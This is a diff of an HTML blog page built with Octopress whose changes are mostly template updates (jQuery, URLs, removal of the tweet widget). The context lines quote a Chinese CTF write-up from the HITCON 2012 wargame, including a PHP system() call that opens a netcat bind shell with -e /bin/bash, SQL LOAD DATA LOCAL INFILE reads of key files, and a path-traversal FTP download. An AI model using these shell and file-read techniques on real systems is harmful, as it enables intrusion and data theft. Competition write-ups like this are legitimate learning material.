@@ -19,13 +19,14 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
 
   
-  <link rel="canonical" href="http://blog.dm4.tw/blog/2012/07/22/hitcon-2012-wargame-notes/">
+  <link rel="canonical" href="http://blog.dm4.tw/blog/2012/07/22/hitcon-2012-wargame-notes">
   <link href="/favicon.png" rel="icon">
   <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
-  <script src="/javascripts/modernizr-2.0.js"></script>
-  <script src="/javascripts/ender.js"></script>
-  <script src="/javascripts/octopress.js" type="text/javascript"></script>
   <link href="/atom.xml" rel="alternate" title="blog.dm4.tw" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
   <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
 <link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
 <link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
@@ -98,7 +99,8 @@
 
 <time datetime="2012-07-22T11:27:00+08:00" pubdate data-updated="true">Jul 22<span>nd</span>, 2012</time>
         
-         | <a href="#disqus_thread">Comments</a>
+           | <a href="#disqus_thread"
+             data-disqus-identifier="http://blog.dm4.tw">Comments</a>
         
       </p>
     
@@ -158,7 +160,7 @@ LOAD DATA LOCAL INFILE '/home/ow200/public_html/key.php' INTO TABLE web2;
 ?&gt;
 </code></pre>
 
-<p>本來以為這題這樣就結束了，不過我們想到既然可以用 <code>cat</code> ，搞不好這題可以&#8230;&#8230;</p>
+<p>本來以為這題這樣就結束了，不過我們想到既然可以用 <code>cat</code> ，搞不好這題可以&hellip;&hellip;</p>
 
 <pre><code>&lt;?php
     system('nc -l -p 5566 -e /bin/bash');
@@ -166,7 +168,7 @@ LOAD DATA LOCAL INFILE '/home/ow200/public_html/key.php' INTO TABLE web2;
 ?&gt;
 </code></pre>
 
-<p>然後&#8230;&#8230;</p>
+<p>然後&hellip;&hellip;</p>
 
 <pre><code>[~] $ nc wg.hack.idv.tw 5566
 id
@@ -186,7 +188,7 @@ LOAD DATA LOCAL INFILE '/home/my100/key.txt' INTO TABLE web3;
 
 <h3>Web 6</h3>
 
-<p>也是用爛招&#8230;&#8230; 用 Web 4 拿到的 shell 去看 Web 6 的 source ，在 <code>/home/a200/public_html/index.php</code>
+<p>也是用爛招&hellip;&hellip; 用 Web 4 拿到的 shell 去看 Web 6 的 source ，在 <code>/home/a200/public_html/index.php</code>
 裡面會判斷如果用 <code>admin</code> 登入的話，會噴 base64 encode 之後的 key</p>
 
 <h3>Potent Pwnables 2</h3>
@@ -216,7 +218,7 @@ local: key.txt remote: ..:/..:/..:/..:/key/dm4key.txt
 </code></pre>
 
 <p>剩下的時間都在試著解 Web 5 ，以及一直看 <a href="http://www.youtube.com/watch?v=l2dvg3KJoPo">駭客觀察日記</a>
-不過看到結束還是沒找到應該怎麼解&#8230;&#8230;</p>
+不過看到結束還是沒找到應該怎麼解&hellip;&hellip;</p>
 
 <p>再次感謝辛苦的主辦單位和工作人員！還有又強又好心收留我帶我一起玩的 crax 隊友！</p>
 
@@ -259,7 +261,7 @@ local: key.txt remote: ..:/..:/..:/..:/key/dm4key.txt
     
       <div class="sharing">
   
-  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://blog.dm4.tw/blog/2012/07/22/hitcon-2012-wargame-notes/" data-via="dm4" data-counturl="http://blog.dm4.tw/blog/2012/07/22/hitcon-2012-wargame-notes/" >Tweet</a>
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://blog.dm4.tw/blog/2012/07/22/hitcon-2012-wargame-notes/" data-via="dm4" data-counturl="http://blog.dm4.tw/blog/2012/07/22/hitcon-2012-wargame-notes/" >Tweet</a>
   
   
   <div class="g-plusone" data-size="medium"></div>
@@ -312,11 +314,11 @@ local: key.txt remote: ..:/..:/..:/..:/key/dm4key.txt
       </li>
     
       <li class="post">
-        <a href="/blog/2012/05/11/dot-bashrc-sourced-twice/">.bashrc sourced twice</a>
+        <a href="/blog/2012/05/11/dot-bashrc-sourced-twice/">.bashrc Sourced Twice</a>
       </li>
     
       <li class="post">
-        <a href="/blog/2012/05/10/and-in-shell-script/">[ and [[ in shell script</a>
+        <a href="/blog/2012/05/10/and-in-shell-script/">[ and [[ in Shell Script</a>
       </li>
     
       <li class="post">
@@ -327,23 +329,6 @@ local: key.txt remote: ..:/..:/..:/..:/key/dm4key.txt
 </section>
 
 <section>
-  <h1>Latest Tweets</h1>
-  <ul id="tweets">
-    <li class="loading">Status updating...</li>
-  </ul>
-  <script type="text/javascript">
-    $.domReady(function(){
-      getTwitterFeed("dm4", 5, false);
-    });
-  </script>
-  <script src="/javascripts/twitter.js" type="text/javascript"> </script>
-  
-    <a href="http://twitter.com/dm4" class="twitter-follow-button" data-show-count="false">Follow @dm4</a>
-  
-</section>
-
-
-<section>
   <h1>GitHub Repos</h1>
   <ul id="gh_repos">
     <li class="loading">Status updating...</li>
@@ -352,7 +337,7 @@ local: key.txt remote: ..:/..:/..:/..:/key/dm4key.txt
   <a href="https://github.com/dm4">@dm4</a> on GitHub
   
   <script type="text/javascript">
-    $.domReady(function(){
+    $(document).ready(function(){
         if (!window.jXHR){
             var jxhr = document.createElement('script');
             jxhr.type = 'text/javascript';
@@ -410,7 +395,7 @@ local: key.txt remote: ..:/..:/..:/..:/key/dm4key.txt
       
     (function () {
       var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
       (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
     }());
 </script>
@@ -421,7 +406,7 @@ local: key.txt remote: ..:/..:/..:/..:/key/dm4key.txt
 <script>(function(d, s, id) {
   var js, fjs = d.getElementsByTagName(s)[0];
   if (d.getElementById(id)) {return;}
-  js = d.createElement(s); js.id = id;
+  js = d.createElement(s); js.id = id; js.async = true;
   js.src = "//connect.facebook.net/en_US/all.js#appId=212934732101925&xfbml=1";
   fjs.parentNode.insertBefore(js, fjs);
 }(document, 'script', 'facebook-jssdk'));</script>
@@ -443,7 +428,7 @@ local: key.txt remote: ..:/..:/..:/..:/key/dm4key.txt
       var twitterWidgets = document.createElement('script');
       twitterWidgets.type = 'text/javascript';
       twitterWidgets.async = true;
-      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
       document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
     })();
   </script>
